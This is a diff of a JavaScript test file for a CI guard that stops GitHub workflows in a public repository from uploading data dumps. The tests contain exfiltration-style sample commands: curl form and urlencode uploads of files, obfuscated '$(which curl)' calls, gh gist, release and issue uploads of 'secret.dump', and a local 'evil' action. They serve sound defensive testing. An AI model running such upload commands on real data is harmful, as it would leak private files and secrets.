@@ -11,14 +11,18 @@ import {
   assertWorkflowUploadAllowlist,
   assertWorkflowsUploadAllowlist,
   assertWorkspaceHasNoDataFiles,
+  collectSteps,
   extractUploadArtifactSteps,
   findForbiddenUploadCommands,
   isAtFileToken,
+  isDataUrlencodeFileArg,
+  isLtFileToken,
   lineLooksLikeCacheSave,
   lineLooksLikeGhApiInput,
   lineLooksLikeHttpUpload,
   logLooksLikeRowData,
   looksLikeDataUpload,
+  tokenMentionsTool,
 } from "../scripts/guard-public-ci.mjs";
 
 const ROOT = new URL("../", import.meta.url).pathname;
@@ -51,7 +55,7 @@ describe("public-repo CI guard", () => {
   it("rejects a dump upload", () => {
     expect(() =>
       assertWorkflowUploadAllowlist(
-        "uses: actions/upload-artifact@sha\n        with:\n          path: secret.dump\n",
+        "uses: actions/upload-artifact@sha\nwith:\n  path: secret.dump\n",
         "bad.yml",
       ),
     ).toThrow(/secret\.dump/);
@@ -60,13 +64,13 @@ describe("public-repo CI guard", () => {
   it("rejects quoted uses and upload-artifact/merge", () => {
     expect(() =>
       assertWorkflowUploadAllowlist(
-        "uses: 'actions/upload-artifact@sha'\n        with:\n          path: leak.dump\n",
+        "uses: 'actions/upload-artifact@sha'\nwith:\n  path: leak.dump\n",
         "quoted.yml",
       ),
     ).toThrow(/leak\.dump/);
     expect(() =>
       assertWorkflowUploadAllowlist(
-        'uses: "actions/upload-artifact@sha"\n        with:\n          path: leak.dump\n',
+        'uses: "actions/upload-artifact@sha"\nwith:\n  path: leak.dump\n',
         "dquoted.yml",
       ),
     ).toThrow(/leak\.dump/);
@@ -74,11 +78,11 @@ describe("public-repo CI guard", () => {
       assertWorkflowUploadAllowlist("uses: actions/upload-artifact/merge@sha\n", "merge.yml"),
     ).toThrow(/upload-artifact\/merge/);
     const quotedOk = extractUploadArtifactSteps(
-      "uses: 'actions/upload-artifact@sha'\n        with:\n          path: artifacts/cutover-report.md\n",
+      "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
     );
     expect(quotedOk[0]?.path).toBe("artifacts/cutover-report.md");
     assertWorkflowUploadAllowlist(
-      "uses: 'actions/upload-artifact@sha'\n        with:\n          path: artifacts/cutover-report.md\n",
+      "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
       "ok.yml",
     );
   });
@@ -167,13 +171,13 @@ describe("public-repo CI guard", () => {
     ]);
     expect(() =>
       assertWorkflowUploadAllowlist(
-        "uses: ncipollo/release-action@v1\n        with:\n          artifacts: secret.dump\n",
+        "uses: ncipollo/release-action@v1\nwith:\n  artifacts: secret.dump\n",
         "ncipollo.yml",
       ),
     ).toThrow(/ncipollo\/release-action/);
     expect(() =>
       assertWorkflowUploadAllowlist(
-        "uses: svenstaro/upload-release-action@v2\n        with:\n          file: secret.dump\n",
+        "uses: svenstaro/upload-release-action@v2\nwith:\n  file: secret.dump\n",
         "sven.yml",
       ),
     ).toThrow(/svenstaro\/upload-release-action/);
@@ -186,19 +190,19 @@ describe("public-repo CI guard", () => {
     expect(() =>
       assertWorkflowUploadAllowlist("run: gh api -F x=@file repos/o/r\n", "field.yml"),
     ).toThrow(/gh @file/);
-    // Desktop publish in release.yml: variables + known artifact names, not a dump.
-    expect(
-      findForbiddenUploadCommands(
-        [
-          'gh release create "$TAG" \\',
-          '  --repo "$RELEASES_REPO" \\',
-          '  --notes-file RELEASE_NOTES.md \\',
-          "  --latest \\",
-          '  "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
-          "",
-        ].join("\n"),
-      ),
-    ).toEqual([]);
+    // Desktop publish: exact tokens, only in release.yml, only with --repo $RELEASES_REPO.
+    const desktopPublish = [
+      'gh release create "$TAG" \\',
+      '  --repo "$RELEASES_REPO" \\',
+      '  --notes-file RELEASE_NOTES.md \\',
+      "  --latest \\",
+      '  "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
+      "",
+    ].join("\n");
+    expect(findForbiddenUploadCommands(desktopPublish, "release.yml")).toEqual([]);
+    expect(findForbiddenUploadCommands(desktopPublish, "cutover-migrate.yml")).toEqual([
+      { line: 1, kind: "gh release create file" },
+    ]);
     expect(findForbiddenUploadCommands("gh api repos/o/r --method PUT --field content=$CONTENT\n")).toEqual(
       [],
     );
@@ -221,9 +225,136 @@ describe("public-repo CI guard", () => {
       assertWorkflowUploadAllowlist("uses: actions/cache/save@v4\n", "cachesave.yml"),
     ).toThrow(/actions\/cache\/save/);
     expect(() =>
-      assertWorkflowUploadAllowlist("uses: actions/cache@v4\n        with:\n          path: dist\n", "cache.yml"),
+      assertWorkflowUploadAllowlist("uses: actions/cache@v4\nwith:\n  path: dist\n", "cache.yml"),
     ).toThrow(/actions\/cache save/);
     assertWorkflowUploadAllowlist("uses: actions/cache/restore@v4\n", "cacherestore.yml");
+  });
+
+  it("reads uses: from the parsed YAML tree, including flow-map and folded values", () => {
+    const flow = [
+      "on: push",
+      "jobs:",
+      "  t:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - { uses: softprops/action-gh-release@v2 }",
+      "",
+    ].join("\n");
+    expect(collectSteps(flow).map((s) => s.uses)).toEqual(["softprops/action-gh-release@v2"]);
+    expect(() => assertWorkflowUploadAllowlist(flow, "flow.yml")).toThrow(/softprops\/action-gh-release/);
+
+    const folded = [
+      "on: push",
+      "jobs:",
+      "  t:",
+      "    steps:",
+      "      - uses: >",
+      "          ncipollo/release-action@v1",
+      "",
+    ].join("\n");
+    expect(collectSteps(folded)[0]?.uses).toMatch(/^ncipollo\/release-action@v1/);
+    expect(() => assertWorkflowUploadAllowlist(folded, "fold.yml")).toThrow(/ncipollo\/release-action/);
+
+    const literal = [
+      "jobs:",
+      "  t:",
+      "    steps:",
+      "      - uses: |",
+      "          svenstaro/upload-release-action@v2",
+      "",
+    ].join("\n");
+    expect(() => assertWorkflowUploadAllowlist(literal, "lit.yml")).toThrow(/svenstaro\/upload-release-action/);
+  });
+
+  it("rejects curl -F with < file contents", () => {
+    expect(isLtFileToken("a=<file")).toBe(true);
+    expect(isLtFileToken("-F<file")).toBe(true);
+    expect(lineLooksLikeHttpUpload('curl -F "a=<file" https://example.com')).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl --form a=<secret.dump https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl -d a<b https://example.com")).toBe(false);
+    expect(() =>
+      assertWorkflowUploadAllowlist('run: curl -F "a=<file" https://example.com\n', "lt.yml"),
+    ).toThrow(/curl\/wget upload/);
+  });
+
+  it("rejects curl --data-urlencode name@file", () => {
+    expect(isDataUrlencodeFileArg("name@file")).toBe(true);
+    expect(isDataUrlencodeFileArg("@file")).toBe(true);
+    expect(isDataUrlencodeFileArg("name=value")).toBe(false);
+    expect(lineLooksLikeHttpUpload("curl --data-urlencode name@file https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl --data-urlencode=name@secret.dump https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl --data-urlencode name=value https://example.com")).toBe(false);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: curl --data-urlencode name@file https://example.com\n", "enc.yml"),
+    ).toThrow(/curl\/wget upload/);
+  });
+
+  it("detects curl/wget/gh inside command tokens, not just as a bare word", () => {
+    expect(tokenMentionsTool("$(which curl)", "curl")).toBe(true);
+    expect(tokenMentionsTool("`curl`", "curl")).toBe(true);
+    expect(tokenMentionsTool("curl)", "curl")).toBe(true);
+    expect(tokenMentionsTool("github", "gh")).toBe(false);
+    expect(lineLooksLikeHttpUpload("$(which curl) -d @f https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("`curl` -d @f https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("env curl -d @f https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("command curl -d @f https://example.com")).toBe(true);
+    expect(findForbiddenUploadCommands("$(which curl) -d @f https://example.com\n")).toEqual([
+      { line: 1, kind: "curl/wget upload" },
+    ]);
+    expect(findForbiddenUploadCommands("command gh gist create secret.dump\n")).toEqual([
+      { line: 1, kind: "gh gist create" },
+    ]);
+  });
+
+  it("allows gh release create assets only in release.yml with the exact desktop tokens", () => {
+    const sneak = "tar czf d.tar.gz dump; gh release create x d.tar.gz\n";
+    expect(findForbiddenUploadCommands(sneak, "cutover-migrate.yml")).toEqual([
+      { line: 1, kind: "gh release create file" },
+    ]);
+    expect(() => assertWorkflowUploadAllowlist(`run: ${sneak}`, "cutover-migrate.yml")).toThrow(
+      /gh release create file/,
+    );
+    expect(findForbiddenUploadCommands("gh release create x $DUMP\n", "release.yml")).toEqual([
+      { line: 1, kind: "gh release create file" },
+    ]);
+    expect(findForbiddenUploadCommands("gh release create x secret.dump\n", "other.yml")).toEqual([
+      { line: 1, kind: "gh release create file" },
+    ]);
+    expect(
+      findForbiddenUploadCommands(
+        'gh release create "$TAG" --latest "$DMG" "$STABLE_DMG" "$APPTAR" latest.json\n',
+        "release.yml",
+      ),
+    ).toEqual([{ line: 1, kind: "gh release create file" }]);
+  });
+
+  it("denies local ./ and docker:// uses unless allowlisted", () => {
+    expect(() => assertWorkflowUploadAllowlist("uses: ./local-upload\n", "local.yml")).toThrow(/local uses/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("uses: docker://ghcr.io/foo/upload:latest\n", "dock.yml"),
+    ).toThrow(/docker:\/\/ uses/);
+    expect(() =>
+      assertWorkflowUploadAllowlist(
+        ["on: push", "jobs:", "  t:", "    steps:", "      - { uses: ./evil }", ""].join("\n"),
+        "flow-local.yml",
+      ),
+    ).toThrow(/local uses/);
+  });
+
+  it("rejects gh issue/pr --body-file and -F", () => {
+    expect(findForbiddenUploadCommands("gh issue create --body-file secret.dump\n")).toEqual([
+      { line: 1, kind: "gh issue/pr --body-file" },
+    ]);
+    expect(findForbiddenUploadCommands("gh pr create -F secret.dump\n")).toEqual([
+      { line: 1, kind: "gh issue/pr --body-file" },
+    ]);
+    expect(findForbiddenUploadCommands("gh issue comment 1 --body-file notes.md\n")).toEqual([
+      { line: 1, kind: "gh issue/pr --body-file" },
+    ]);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: gh pr create --body-file dump.csv\n", "pr.yml"),
+    ).toThrow(/gh issue\/pr --body-file/);
+    expect(findForbiddenUploadCommands("gh pr list\n")).toEqual([]);
   });
 
   it("rejects a multi-path dump + hash upload", () => {
@@ -231,10 +362,10 @@ describe("public-repo CI guard", () => {
       assertWorkflowUploadAllowlist(
         [
           "uses: actions/upload-artifact@sha",
-          "        with:",
-          "          path: |",
-          "            artifacts/nuvo-source.dump",
-          "            artifacts/nuvo-source.sha256",
+          "with:",
+          "  path: |",
+          "    artifacts/nuvo-source.dump",
+          "    artifacts/nuvo-source.sha256",
           "",
         ].join("\n"),
         "dump.yml",
